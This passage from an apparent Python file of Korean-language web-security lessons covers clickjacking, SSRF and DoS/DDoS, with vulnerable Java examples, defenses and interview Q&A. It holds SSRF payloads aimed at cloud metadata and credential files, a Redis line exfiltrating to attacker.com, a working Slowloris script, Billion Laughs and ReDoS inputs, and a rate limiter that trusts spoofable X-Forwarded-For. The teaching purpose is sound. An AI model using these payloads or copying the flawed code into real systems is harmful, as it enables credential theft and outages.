.header(\"X-Frame-Options\", \"ALLOW-FROM https://trusted-partner.com\")\n            .body(widget);\n    }\n}\n\n// ═══════════════════════════════════════════════════════════════\n// JavaScript 프레임 버스팅 (레거시 방어, 백업용)\n// ═══════════════════════════════════════════════════════════════\n/*\n<script>\n// 페이지가 iframe 내에서 로드되면 탈출\nif (window.top !== window.self) {\n    // 방법 1: 최상위 창으로 리다이렉트\n    window.top.location = window.self.location;\n}\n\n// 더 강력한 버전\n(function() {\n    // iframe 내에 있는지 확인\n    if (self !== top) {\n        // sandbox 속성으로 인해 탈출이 막힐 수 있으므로\n        // 페이지 내용을 숨기고 경고 표시\n        document.body.innerHTML = '';\n        document.body.style.display = 'none';\n        \n        // 탈출 시도\n        try {\n            top.location = self.location;\n        } catch (e) {\n            // 탈출 불가능하면 경고\n            alert('이 페이지는 직접 방문해야 합니다.');\n        }\n    }\n})();\n</script>\n\n// 주의: JavaScript 방어만으로는 불충분\n// - 공격자가 sandbox=\"allow-forms\" 사용하면 우회 가능\n// - 반드시 서버 헤더(X-Frame-Options, CSP)와 함께 사용\n*/\n\n// ═══════════════════════════════════════════════════════════════\n// 중요 작업에 대한 추가 클릭재킹 방어\n// ═══════════════════════════════════════════════════════════════\n\n@RestController\n@RequestMapping(\"/api/critical\")\npublic class CriticalActionController {\n    \n    // 중요 작업 전 사용자 확인 요구\n    @PostMapping(\"/transfer\")\n    public ResponseEntity<?> transferMoney(\n            @RequestBody TransferRequest request,\n            @RequestHeader(\"X-Confirm-Action\") String confirmToken,\n            HttpSession session) {\n        \n        // 1. 서버에서 발급한 확인 토큰 검증\n        String expectedToken = (String) session.getAttribute(\"confirmToken\");\n        if (expectedToken == null || !expectedToken.equals(confirmToken)) {\n            return ResponseEntity.badRequest()\n                .body(\"확인 토큰이 유효하지 않습니다. 다시 시도해주세요.\");\n        }\n        \n        // 2. 사용된 토큰 무효화 (재사용 방지)\n        session.removeAttribute(\"confirmToken\");\n        \n        // 3. 송금 처리\n        transferService.transfer(request);\n        \n        return ResponseEntity.ok(\"송금이 완료되었습니다.\");\n    }\n    \n    // 확인 토큰 발급 (송금 페이지 로드 시)\n    @GetMapping(\"/transfer/confirm-token\")\n    public ResponseEntity<?> getConfirmToken(HttpSession session) {\n        String token = UUID.randomUUID().toString();\n        session.setAttribute(\"confirmToken\", token);\n        return ResponseEntity.ok(Map.of(\"token\", token));\n    }\n}"
            },
            {
                "type": "tip",
                "title": "실무 체크리스트 & 면접",
                "content": "## 클릭재킹 방어 체크리스트\n\n### 서버 헤더 설정\n- [ ] X-Frame-Options 헤더 설정 (DENY 또는 SAMEORIGIN)\n- [ ] Content-Security-Policy frame-ancestors 설정\n- [ ] 모든 페이지에 일관되게 적용되는지 확인\n- [ ] CDN/프록시에서 헤더가 제거되지 않는지 확인\n\n### 특수 케이스 처리\n- [ ] 임베드가 필요한 페이지는 화이트리스트 방식으로 허용\n- [ ] 위젯/공유 콘텐츠는 별도 도메인에서 제공\n- [ ] OAuth 팝업 등은 별도 처리\n\n### 추가 방어\n- [ ] 중요 작업에 확인 다이얼로그 구현\n- [ ] 마우스 움직임 패턴 분석 (봇/자동화 탐지)\n- [ ] JavaScript 프레임 버스팅 (레거시 브라우저 대응)\n\n---\n\n## 면접 질문\n\n### Junior (신입/주니어)\n\n**Q: 클릭재킹이 무엇인가요?**\n> A: 클릭재킹은 투명한 iframe을 사용하여 사용자가 보이지 않는 페이지의 버튼을 클릭하게 만드는 공격입니다. 예를 들어, \"무료 쿠폰 받기\" 버튼을 클릭했지만 실제로는 \"송금 확인\" 버튼을 클릭한 것이 됩니다.\n\n**Q: X-Frame-Options 헤더의 값들은 무엇인가요?**\n> A: DENY(어디서도 iframe 불가), SAMEORIGIN(같은 출처에서만 허용), ALLOW-FROM uri(특정 출처에서만 허용, 현재는 deprecated)이 있습니다.\n\n### Senior (경력)\n\n**Q: X-Frame-Options와 CSP frame-ancestors의 차이점은?**\n> A: X-Frame-Options는 오래된 표준으로 단일 값만 지정 가능하고, CSP frame-ancestors는 여러 출처를 지정할 수 있으며 더 세밀한 제어가 가능합니다. 둘 다 설정된 경우 CSP frame-ancestors가 우선합니다. 최신 브라우저에서는 CSP 사용을 권장합니다.\n\n**Q: JavaScript 프레임 버스팅의 한계점은?**\n> A: 1) sandbox 속성으로 JavaScript 실행을 차단할 수 있음\n> 2) allow-top-navigation 없이 sandbox 설정하면 탈출 불가\n> 3) 스크립트 로드 전에 클릭이 발생할 수 있음\n> 4) NoScript 등으로 JavaScript 비활성화 시 무력화\n> 따라서 반드시 서버 헤더와 함께 사용해야 합니다.\n\n---\n\n## 학습 리소스\n\n- **OWASP Clickjacking**: https://owasp.org/www-community/attacks/Clickjacking\n- **MDN X-Frame-Options**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n- **CSP frame-ancestors**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors"
            }
        ]
    }

def get_ssrf_content():
    """SSRF (Server-Side Request Forgery) attack content"""
    return {
        "id": "02_공격/ssrf",
        "title": "SSRF 공격 (Server-Side Request Forgery)",
        "category": "security",
        "subCategory": "02_공격",
        "language": "Java",
        "description": "SSRF(Server-Side Request Forgery) 공격의 원리와 내부 네트워크 침투, 클라우드 메타데이터 탈취 등의 위험성 및 방어 기법을 학습합니다.",
        "isPlaceholder": False,
        "sections": [
            {
                "type": "concept",
                "title": "SSRF 공격 완전 정복",
                "content": "## 한 줄 요약\n> **SSRF는 서버를 속여서 내부 네트워크나 외부 시스템에 악의적인 요청을 보내게 만드는 공격입니다.**\n\n## 비유로 이해하기\n\n**회사 내부 전화 비유:**\n\n```\n[정상 시나리오]\n고객 --> 회사 대표번호 --> 고객센터 --> \"상품 문의드립니다\"\n\n[SSRF 공격]\n해커 --> 회사 대표번호 --> \"금고실에 전화 연결해주세요\"\n                       --> 금고실: \"내부 전화네, 알겠습니다\"\n                       --> 금고 열림!\n```\n\n**핵심:** 외부에서 직접 접근 불가능한 내부 시스템에 \"서버\"를 통해 우회 접근!\n\n```\n[회사 네트워크 구조]\n\n    인터넷\n      │\n  ┌───┴───┐\n  │방화벽 │ <-- 외부에서 직접 접근 차단\n  └───┬───┘\n      │\n┌─────┴─────┐\n│ 웹 서버   │ <-- 해커가 여기를 조종\n│ (공개)    │\n└─────┬─────┘\n      │ (내부 네트워크)\n ┌────┼────┬────────┐\n │    │    │        │\n▼    ▼    ▼        ▼\nDB  Redis  관리자  AWS 메타데이터\n서버 서버  콘솔   (169.254.169.254)\n\n해커: \"웹 서버야, 저 AWS 메타데이터 서버에 요청 보내봐\"\n웹 서버: \"내부 요청이니까 OK!\" --> 자격 증명 유출!\n```\n\n## 실제 해킹 사고\n\n### Capital One 대규모 유출 사건 (2019)\n- **피해**: 1억 명 이상의 개인정보 유출\n- **원인**: AWS EC2 메타데이터 엔드포인트(169.254.169.254)로 SSRF 공격\n- **결과**: IAM 자격 증명 탈취 후 S3 버킷 접근\n- **벌금/배상**: 8천만 달러 벌금, 1.9억 달러 합의금\n\n### Uber SSRF 취약점 (2016)\n- **피해**: 내부 시스템 정보 노출\n- **원인**: 이미지 업로드 기능에서 URL 검증 미흡\n- **결과**: 버그 바운티로 $10,000 지급\n\n### GitLab SSRF (CVE-2021-22214)\n- **피해**: 내부 네트워크 스캔 및 서비스 접근 가능\n- **원인**: 웹훅 URL 검증 우회\n- **CVSS 점수**: 8.6 (High)"
            },
            {
                "type": "code",
                "title": "공격 원리와 취약한 코드",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// SSRF 공격 시나리오와 취약한 코드\n// ═══════════════════════════════════════════════════════════════\n\n// ========================================\n// 취약한 코드: URL 미리보기 기능\n// ========================================\n@RestController\n@RequestMapping(\"/api/preview\")\npublic class VulnerablePreviewController {\n    \n    @Autowired\n    private RestTemplate restTemplate;\n    \n    // 취약점: 사용자 입력 URL을 검증 없이 요청\n    @PostMapping(\"/url\")\n    public ResponseEntity<String> previewUrl(@RequestParam String url) {\n        try {\n            // 해커가 url = \"http://169.254.169.254/latest/meta-data/\" 전송\n            // --> AWS 인스턴스 메타데이터 노출!\n            String content = restTemplate.getForObject(url, String.class);\n            return ResponseEntity.ok(content);\n        } catch (Exception e) {\n            return ResponseEntity.badRequest().body(\"URL 접근 실패\");\n        }\n    }\n}\n\n// ========================================\n// 공격 예시 1: AWS 메타데이터 탈취\n// ========================================\n/*\n해커의 요청:\nPOST /api/preview/url\nurl=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n응답:\n{\n    \"AccessKeyId\": \"ASIAXXX...\",\n    \"SecretAccessKey\": \"xxx...\",\n    \"Token\": \"xxx...\"\n}\n\n해커: 이 자격 증명으로 AWS 리소스 접근 가능!\naws s3 ls --profile stolen-creds\n*/\n\n// ========================================\n// 공격 예시 2: 내부 서비스 스캔\n// ========================================\n/*\n해커의 요청 시퀀스:\n\n1. 내부 IP 스캔\nurl=http://192.168.1.1:22      --> \"Connection refused\" (SSH 없음)\nurl=http://192.168.1.1:80      --> 응답 있음! (웹 서버 발견)\nurl=http://192.168.1.1:6379    --> \"PONG\" (Redis 발견!)\n\n2. 내부 Redis 공격\nurl=http://192.168.1.1:6379/\n   SLAVEOF attacker.com 6379   --> Redis 데이터 탈취\n*/\n\n// ========================================\n// 공격 예시 3: 파일 시스템 접근 (file:// 프로토콜)\n// ========================================\n/*\nurl=file:///etc/passwd\n응답:\nroot:x:0:0:root:/root:/bin/bash\n...\n\nurl=file:///home/app/.aws/credentials\n응답:\n[default]\naws_access_key_id = AKIAXXX...\naws_secret_access_key = xxx...\n*/\n\n// ========================================\n// 취약한 코드: 이미지 다운로드\n// ========================================\n@RestController\n@RequestMapping(\"/api/image\")\npublic class VulnerableImageController {\n    \n    @PostMapping(\"/download\")\n    public ResponseEntity<byte[]> downloadImage(@RequestParam String imageUrl) {\n        try {\n            URL url = new URL(imageUrl);\n            // 문제: URL 검증 없이 연결\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            try (InputStream is = conn.getInputStream()) {\n                byte[] imageBytes = is.readAllBytes();\n                return ResponseEntity.ok()\n                    .contentType(MediaType.IMAGE_JPEG)\n                    .body(imageBytes);\n            }\n        } catch (Exception e) {\n            return ResponseEntity.badRequest().build();\n        }\n    }\n}\n\n// ========================================\n// 취약한 코드: PDF 생성 (외부 리소스 포함)\n// ========================================\n@Service\npublic class VulnerablePdfService {\n    \n    public byte[] generatePdfFromHtml(String htmlContent) {\n        // htmlContent에 외부 리소스 참조 가능\n        // <img src=\"http://169.254.169.254/latest/meta-data/\">\n        // <link href=\"http://internal-server/admin\">\n        \n        // PDF 라이브러리가 이미지 로드 시 내부 요청 발생!\n        return pdfGenerator.generate(htmlContent);\n    }\n}\n\n// ========================================\n// 취약한 코드: 웹훅 기능\n// ========================================\n@RestController\n@RequestMapping(\"/api/webhook\")\npublic class VulnerableWebhookController {\n    \n    @PostMapping(\"/register\")\n    public ResponseEntity<?> registerWebhook(\n            @RequestParam String callbackUrl,\n            @RequestParam String secret) {\n        \n        // 콜백 URL 검증 없이 저장\n        webhookService.register(callbackUrl, secret);\n        \n        // 이벤트 발생 시 이 URL로 요청 전송\n        // 해커: callbackUrl = \"http://internal-db:5432/\" 등록\n        \n        return ResponseEntity.ok(\"등록 완료\");\n    }\n}"
            },
            {
                "type": "code",
                "title": "방어 코드와 실전",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// SSRF 방어 구현 (Spring Boot 3.x)\n// ═══════════════════════════════════════════════════════════════\n\n@Service\npublic class SsrfProtectedUrlService {\n    \n    private static final Logger log = LoggerFactory.getLogger(SsrfProtectedUrlService.class);\n    \n    // 허용된 호스트 화이트리스트\n    private static final Set<String> ALLOWED_HOSTS = Set.of(\n        \"api.example.com\",\n        \"cdn.example.com\",\n        \"images.example.com\"\n    );\n    \n    // 차단할 IP 대역\n    private static final List<IpRange> BLOCKED_IP_RANGES = List.of(\n        new IpRange(\"10.0.0.0\", 8),       // Private A\n        new IpRange(\"172.16.0.0\", 12),    // Private B\n        new IpRange(\"192.168.0.0\", 16),   // Private C\n        new IpRange(\"127.0.0.0\", 8),      // Loopback\n        new IpRange(\"169.254.0.0\", 16),   // Link-local (AWS 메타데이터!)\n        new IpRange(\"0.0.0.0\", 8)         // Current network\n    );\n    \n    // 허용된 프로토콜\n    private static final Set<String> ALLOWED_PROTOCOLS = Set.of(\"https\");\n    \n    /**\n     * URL 검증 및 안전한 요청 수행\n     */\n    public String fetchUrl(String urlString) throws SsrfException {\n        try {\n            // 1. URL 파싱 및 기본 검증\n            URL url = validateAndParseUrl(urlString);\n            \n            // 2. 프로토콜 검증\n            validateProtocol(url);\n            \n            // 3. 호스트 검증 (화이트리스트)\n            validateHost(url);\n            \n            // 4. IP 주소 검증 (DNS Rebinding 방어)\n            InetAddress resolvedAddress = validateIpAddress(url);\n            \n            // 5. 안전한 연결 생성\n            return executeSecureRequest(url, resolvedAddress);\n            \n        } catch (MalformedURLException e) {\n            throw new SsrfException(\"잘못된 URL 형식입니다.\", e);\n        } catch (UnknownHostException e) {\n            throw new SsrfException(\"호스트를 찾을 수 없습니다.\", e);\n        }\n    }\n    \n    private URL validateAndParseUrl(String urlString) throws MalformedURLException, SsrfException {\n        if (urlString == null || urlString.isBlank()) {\n            throw new SsrfException(\"URL이 비어있습니다.\");\n        }\n        \n        // URL 인코딩 공격 방지\n        String normalizedUrl = urlString.toLowerCase().trim();\n        \n        // 우회 시도 탐지\n        if (normalizedUrl.contains(\"@\") ||       // user@host 형식\n            normalizedUrl.contains(\"%\") ||       // URL 인코딩\n            normalizedUrl.contains(\"\\\\\") ||      // 역슬래시\n            normalizedUrl.matches(\".*\\\\d{10,}.*\")) { // 숫자 IP (2130706433 = 127.0.0.1)\n            throw new SsrfException(\"의심스러운 URL 형식입니다.\");\n        }\n        \n        return new URL(urlString);\n    }\n    \n    private void validateProtocol(URL url) throws SsrfException {\n        String protocol = url.getProtocol().toLowerCase();\n        if (!ALLOWED_PROTOCOLS.contains(protocol)) {\n            log.warn(\"차단된 프로토콜 시도: {}\", protocol);\n            throw new SsrfException(\"허용되지 않은 프로토콜입니다: \" + protocol);\n        }\n    }\n    \n    private void validateHost(URL url) throws SsrfException {\n        String host = url.getHost().toLowerCase();\n        \n        // 화이트리스트 검증\n        if (!ALLOWED_HOSTS.contains(host)) {\n            log.warn(\"화이트리스트에 없는 호스트: {}\", host);\n            throw new SsrfException(\"허용되지 않은 호스트입니다: \" + host);\n        }\n    }\n    \n    private InetAddress validateIpAddress(URL url) throws SsrfException, UnknownHostException {\n        // DNS 조회\n        InetAddress address = InetAddress.getByName(url.getHost());\n        String ipAddress = address.getHostAddress();\n        \n        // 사설 IP 대역 검증\n        for (IpRange range : BLOCKED_IP_RANGES) {\n            if (range.contains(ipAddress)) {\n                log.warn(\"차단된 IP 대역 접근 시도: {} -> {}\", url.getHost(), ipAddress);\n                throw new SsrfException(\"접근이 차단된 IP 대역입니다.\");\n            }\n        }\n        \n        // IPv6 루프백 검증\n        if (address.isLoopbackAddress() || address.isLinkLocalAddress()) {\n            throw new SsrfException(\"로컬 주소 접근이 차단되었습니다.\");\n        }\n        \n        return address;\n    }\n    \n    private String executeSecureRequest(URL url, InetAddress resolvedAddress) throws SsrfException {\n        try {\n            // DNS Rebinding 방어: 직접 IP로 연결\n            HttpClient client = HttpClient.newBuilder()\n                .connectTimeout(Duration.ofSeconds(5))\n                .followRedirects(HttpClient.Redirect.NEVER)  // 리다이렉트 차단!\n                .build();\n            \n            // Host 헤더는 원래 호스트로, 실제 연결은 검증된 IP로\n            URI uri = new URI(\n                url.getProtocol(),\n                null,\n                resolvedAddress.getHostAddress(),\n                url.getPort() == -1 ? 443 : url.getPort(),\n                url.getPath(),\n                url.getQuery(),\n                null\n            );\n            \n            HttpRequest request = HttpRequest.newBuilder()\n                .uri(uri)\n                .header(\"Host\", url.getHost())  // SNI를 위해 원래 호스트 사용\n                .timeout(Duration.ofSeconds(10))\n                .GET()\n                .build();\n            \n            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n            \n            // 응답 크기 제한\n            if (response.body().length() > 1024 * 1024) { // 1MB\n                throw new SsrfException(\"응답 크기가 너무 큽니다.\");\n            }\n            \n            return response.body();\n            \n        } catch (Exception e) {\n            throw new SsrfException(\"요청 실행 중 오류가 발생했습니다.\", e);\n        }\n    }\n}\n\n// IP 범위 검증 유틸리티\npublic class IpRange {\n    private final long start;\n    private final long end;\n    \n    public IpRange(String cidrBase, int prefixLength) {\n        long base = ipToLong(cidrBase);\n        long mask = (0xFFFFFFFFL << (32 - prefixLength)) & 0xFFFFFFFFL;\n        this.start = base & mask;\n        this.end = start | ~mask & 0xFFFFFFFFL;\n    }\n    \n    public boolean contains(String ip) {\n        long ipLong = ipToLong(ip);\n        return ipLong >= start && ipLong <= end;\n    }\n    \n    private static long ipToLong(String ip) {\n        String[] octets = ip.split(\"\\\\.\");\n        return ((Long.parseLong(octets[0]) << 24) +\n                (Long.parseLong(octets[1]) << 16) +\n                (Long.parseLong(octets[2]) << 8) +\n                Long.parseLong(octets[3]));\n    }\n}"
            },
            {
                "type": "tip",
                "title": "실무 체크리스트 & 면접",
                "content": "## SSRF 방어 체크리스트\n\n### URL 검증\n- [ ] 프로토콜 화이트리스트 (https만 허용)\n- [ ] 호스트 화이트리스트 적용\n- [ ] URL 파싱 전 정규화 수행\n- [ ] 특수문자 및 인코딩 공격 필터링\n\n### IP 주소 검증\n- [ ] 사설 IP 대역 (10.x, 172.16-31.x, 192.168.x) 차단\n- [ ] 루프백 주소 (127.x, localhost) 차단\n- [ ] 링크-로컬 주소 (169.254.x) 차단 - AWS 메타데이터!\n- [ ] IPv6 로컬 주소 차단\n\n### DNS Rebinding 방어\n- [ ] DNS 조회 후 IP 검증\n- [ ] 검증된 IP로 직접 연결\n- [ ] DNS 캐시 TTL 적절히 설정\n\n### 네트워크 수준 방어\n- [ ] 아웃바운드 방화벽 규칙 설정\n- [ ] AWS IMDSv2 사용 (토큰 필요)\n- [ ] 내부 서비스에 인증 요구\n\n---\n\n## 면접 질문\n\n### Junior (신입/주니어)\n\n**Q: SSRF가 무엇인가요?**\n> A: SSRF는 Server-Side Request Forgery의 약자로, 공격자가 서버를 속여 내부 네트워크나 외부 시스템에 요청을 보내게 만드는 공격입니다. 서버가 방화벽 뒤에 있는 내부 시스템에 접근할 수 있는 점을 악용합니다.\n\n**Q: SSRF로 어떤 피해가 발생할 수 있나요?**\n> A: 1) 내부 시스템 정보 노출 (DB, 관리 콘솔)\n> 2) 클라우드 메타데이터 탈취 (AWS IAM 자격 증명)\n> 3) 내부 서비스 공격 (Redis, Elasticsearch)\n> 4) 포트 스캔을 통한 내부 네트워크 매핑\n\n### Senior (경력)\n\n**Q: DNS Rebinding 공격이 무엇이고 어떻게 방어하나요?**\n> A: DNS Rebinding은 처음에는 정상 IP를 반환하다가 이후 내부 IP를 반환하도록 DNS를 조작하는 공격입니다. 방어 방법:\n> 1) DNS 조회 결과를 캐시하고 검증된 IP로만 연결\n> 2) DNS 조회와 실제 연결 사이 시간 최소화\n> 3) 연결 시점에 다시 IP 검증 수행\n\n**Q: AWS 환경에서 SSRF를 어떻게 방어하나요?**\n> A: 1) IMDSv2 사용 강제 (PUT 요청으로 토큰 획득 필요)\n> 2) 169.254.169.254 접근 차단 (iptables, Security Group)\n> 3) IAM Role에 최소 권한 원칙 적용\n> 4) VPC 엔드포인트를 통한 AWS 서비스 접근\n> 5) 아웃바운드 트래픽 제한\n\n---\n\n## 학습 리소스\n\n- **OWASP SSRF**: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n- **PortSwigger SSRF Labs**: https://portswigger.net/web-security/ssrf\n- **AWS IMDSv2**: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html\n- **Capital One Breach Analysis**: https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/"
            }
        ]
    }

def get_dos_ddos_content():
    """DoS/DDoS attack and defense content"""
    return {
        "id": "02_공격/dos-ddos",
        "title": "DoS/DDoS 공격과 방어",
        "category": "security",
        "subCategory": "02_공격",
        "language": "Java",
        "description": "DoS(Denial of Service)와 DDoS(Distributed DoS) 공격의 원리, 유형(SYN Flood, HTTP Flood, Slowloris 등)과 방어 기법을 학습합니다.",
        "isPlaceholder": False,
        "sections": [
            {
                "type": "concept",
                "title": "DoS/DDoS 공격 완전 정복",
                "content": "## 한 줄 요약\n> **DoS/DDoS는 서버에 과도한 요청을 보내 정상 사용자가 서비스를 이용하지 못하게 만드는 공격입니다.**\n\n## 비유로 이해하기\n\n**식당 비유:**\n\n```\n[정상 상황]\n식당 좌석: 50개\n고객: 30명\n결과: 모두 식사 가능\n\n[DoS 공격]\n해커 혼자서 계속 전화 주문 (끊지 않음)\n전화기: 1대\n결과: 다른 고객 전화 연결 불가\n\n[DDoS 공격]\n해커가 1000명에게 돈 주고 부탁:\n\"저 식당에 동시에 전화해서 메뉴판 읽어달라고 해\"\n결과: 전화 폭주, 식당 마비, 진짜 고객 주문 불가\n```\n\n**공격 유형 비유:**\n\n```\n[SYN Flood - 악수만 하고 도망]\n해커: \"안녕하세요\" (SYN)\n서버: \"네, 안녕하세요\" (SYN-ACK) ... 대기 중...\n해커: (응답 안 함, 다음 피해자에게 이동)\n결과: 서버가 수천 개의 \"대기 중\" 연결로 자원 고갈\n\n[HTTP Flood - 정상처럼 보이는 폭탄]\n해커 봇넷: GET /search?q=aaaaaa... (초당 10만 건)\n서버: 모든 요청이 정상 HTTP라 구분 어려움\n결과: 서버 과부하\n\n[Slowloris - 천천히 죽이기]\n해커: HTTP 요청을 아주 천천히 전송 (1바이트/10초)\n서버: \"아직 요청 안 끝났네, 기다려야지\"\n결과: 모든 연결 슬롯이 느린 연결로 점유됨\n```\n\n## 실제 해킹 사고\n\n### GitHub DDoS 공격 (2018)\n- **피해**: 1.35 Tbps 트래픽, 역대 최대 규모\n- **방식**: Memcached 증폭 공격\n- **복구**: Akamai Prolexic으로 8분 만에 완화\n- **특징**: 증폭률 51,000배 (1바이트 요청 → 51KB 응답)\n\n### Dyn DNS DDoS (2016)\n- **피해**: Twitter, Netflix, Reddit 등 주요 서비스 마비\n- **방식**: Mirai 봇넷 (IoT 기기 50만 대)\n- **규모**: 1.2 Tbps\n- **원인**: 기본 비밀번호 사용 IoT 기기 해킹\n\n### AWS DDoS 공격 (2020)\n- **피해**: AWS 고객사 대상 2.3 Tbps 공격\n- **방식**: CLDAP 반사 공격\n- **결과**: AWS Shield가 자동 방어\n- **특징**: 역대 최대 규모 DDoS로 기록"
            },
            {
                "type": "code",
                "title": "공격 원리와 취약한 코드",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// DoS/DDoS 공격 유형과 취약한 코드 패턴\n// ═══════════════════════════════════════════════════════════════\n\n// ========================================\n// 1. Slowloris 공격에 취약한 설정\n// ========================================\n\n// application.yml - 취약한 설정\n/*\nserver:\n  tomcat:\n    connection-timeout: 60000    # 60초 - 너무 김!\n    max-connections: 200         # 연결 수 제한 없음\n    accept-count: 100\n    # keep-alive-timeout 설정 없음\n*/\n\n// Slowloris 공격 시뮬레이션 (Python 예시)\n/*\nimport socket\nimport time\n\ntarget = \"victim.com\"\nport = 80\nsocket_list = []\n\nfor i in range(200):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target, port))\n    s.send(b\"GET / HTTP/1.1\\r\\n\")\n    s.send(b\"Host: victim.com\\r\\n\")\n    # 헤더를 완성하지 않고 천천히 전송\n    socket_list.append(s)\n\nwhile True:\n    for s in socket_list:\n        s.send(b\"X-Custom: keep-alive\\r\\n\")  # 연결 유지\n    time.sleep(15)\n*/\n\n// ========================================\n// 2. ReDoS (Regular Expression DoS) 취약 코드\n// ========================================\n@RestController\npublic class VulnerableValidationController {\n    \n    // 취약한 정규식: 백트래킹 폭발\n    // 입력: \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\" → 수 초~수 분 소요\n    private static final Pattern EVIL_PATTERN = \n        Pattern.compile(\"^(a+)+$\");  // 중첩 반복 → 지수적 복잡도\n    \n    @PostMapping(\"/validate-email\")\n    public String validateEmail(@RequestParam String email) {\n        // 이메일 검증에 취약한 정규식 사용\n        // 공격자: email = \"a]\" 반복 100번 + \"X\"\n        if (EVIL_PATTERN.matcher(email).matches()) {\n            return \"Valid\";\n        }\n        return \"Invalid\";\n    }\n}\n\n// 더 심각한 ReDoS 패턴들\n/*\n(.*a){x}          // x가 클수록 느림\n([a-zA-Z]+)*      // 중첩 반복\n(a|aa)+           // 모호한 매칭\n(a|a?)+           // 선택적 매칭 중첩\n*/\n\n// ========================================\n// 3. Hash Collision DoS 취약 코드\n// ========================================\n@RestController\npublic class VulnerableHashController {\n    \n    // Java HashMap의 해시 충돌 취약점 (Java 7 이하)\n    @PostMapping(\"/process\")\n    public String processData(@RequestBody Map<String, String> data) {\n        // 공격자가 같은 해시값을 가진 수천 개의 키 전송\n        // HashMap이 LinkedList처럼 동작 → O(n) → O(n²)\n        \n        for (Map.Entry<String, String> entry : data.entrySet()) {\n            // 각 조회가 O(n)이 됨\n            process(entry.getKey(), entry.getValue());\n        }\n        return \"Processed\";\n    }\n}\n\n// ========================================\n// 4. 무한 루프 유발 취약 코드\n// ========================================\n@RestController\npublic class VulnerableLoopController {\n    \n    @GetMapping(\"/parse\")\n    public String parseXml(@RequestParam String xmlUrl) throws Exception {\n        // XXE + Billion Laughs 공격\n        // <!DOCTYPE lolz [\n        //   <!ENTITY lol \"lol\">\n        //   <!ENTITY lol2 \"&lol;&lol;&lol;...\">\n        //   ...\n        // ]>\n        // <lolz>&lol9;</lolz>  → 메모리 폭발!\n        \n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        // 취약: XXE 방어 없음\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(xmlUrl);\n        return doc.toString();\n    }\n}\n\n// ========================================\n// 5. 리소스 고갈 취약 코드\n// ========================================\n@RestController\npublic class VulnerableResourceController {\n    \n    // 파일 업로드 크기 제한 없음\n    @PostMapping(\"/upload\")\n    public String uploadFile(@RequestParam MultipartFile file) {\n        // 공격자: 10GB 파일 업로드 → 디스크/메모리 고갈\n        byte[] content = file.getBytes();  // OOM 가능\n        return \"Uploaded\";\n    }\n    \n    // 페이지네이션 없는 조회\n    @GetMapping(\"/users\")\n    public List<User> getAllUsers() {\n        // 공격자: 수백만 레코드 조회 요청\n        return userRepository.findAll();  // 메모리 고갈\n    }\n    \n    // 무제한 검색\n    @GetMapping(\"/search\")\n    public List<Product> search(@RequestParam String keyword) {\n        // 공격자: keyword = \"a\" → 거의 모든 상품 반환\n        return productRepository.findByNameContaining(keyword);\n    }\n}"
            },
            {
                "type": "code",
                "title": "방어 코드와 실전",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// DoS/DDoS 방어 구현 (Spring Boot 3.x)\n// ═══════════════════════════════════════════════════════════════\n\n// ========================================\n// 1. Rate Limiting 구현 (Bucket4j 사용)\n// ========================================\n\n@Configuration\npublic class RateLimitConfig {\n    \n    @Bean\n    public Bucket4jRateLimiter rateLimiter() {\n        // IP당 분당 100 요청, 버스트 최대 20 허용\n        return Bucket4jRateLimiter.builder()\n            .addLimit(Bandwidth.classic(100, Refill.intervally(100, Duration.ofMinutes(1))))\n            .addLimit(Bandwidth.classic(20, Refill.intervally(20, Duration.ofSeconds(1))))\n            .build();\n    }\n}\n\n@Component\npublic class RateLimitFilter extends OncePerRequestFilter {\n    \n    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();\n    private static final Logger log = LoggerFactory.getLogger(RateLimitFilter.class);\n    \n    @Override\n    protected void doFilterInternal(\n            HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain) throws ServletException, IOException {\n        \n        String clientIp = getClientIp(request);\n        Bucket bucket = buckets.computeIfAbsent(clientIp, this::createNewBucket);\n        \n        ConsumptionProbe probe = bucket.tryConsumeAndReturnRemaining(1);\n        \n        if (probe.isConsumed()) {\n            // 남은 요청 수 헤더에 포함\n            response.addHeader(\"X-Rate-Limit-Remaining\", \n                String.valueOf(probe.getRemainingTokens()));\n            filterChain.doFilter(request, response);\n        } else {\n            // 429 Too Many Requests\n            log.warn(\"Rate limit exceeded for IP: {}\", clientIp);\n            response.setStatus(429);\n            response.addHeader(\"Retry-After\", \n                String.valueOf(probe.getNanosToWaitForRefill() / 1_000_000_000));\n            response.getWriter().write(\"Too many requests. Please try again later.\");\n        }\n    }\n    \n    private Bucket createNewBucket(String key) {\n        return Bucket.builder()\n            .addLimit(Bandwidth.classic(100, Refill.intervally(100, Duration.ofMinutes(1))))\n            .addLimit(Bandwidth.classic(20, Refill.intervally(20, Duration.ofSeconds(1))))\n            .build();\n    }\n    \n    private String getClientIp(HttpServletRequest request) {\n        String xForwardedFor = request.getHeader(\"X-Forwarded-For\");\n        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {\n            return xForwardedFor.split(\",\")[0].trim();\n        }\n        return request.getRemoteAddr();\n    }\n}\n\n// ========================================\n// 2. Slowloris 방어 설정\n// ========================================\n\n// application.yml - 안전한 설정\n/*\nserver:\n  tomcat:\n    connection-timeout: 5000        # 5초로 단축\n    max-connections: 10000\n    accept-count: 100\n    keep-alive-timeout: 30000       # Keep-alive 30초\n    max-keep-alive-requests: 100    # 연결당 최대 요청 수\n    \n  # 요청 크기 제한\n  max-http-request-header-size: 8KB\n  \nspring:\n  servlet:\n    multipart:\n      max-file-size: 10MB           # 파일 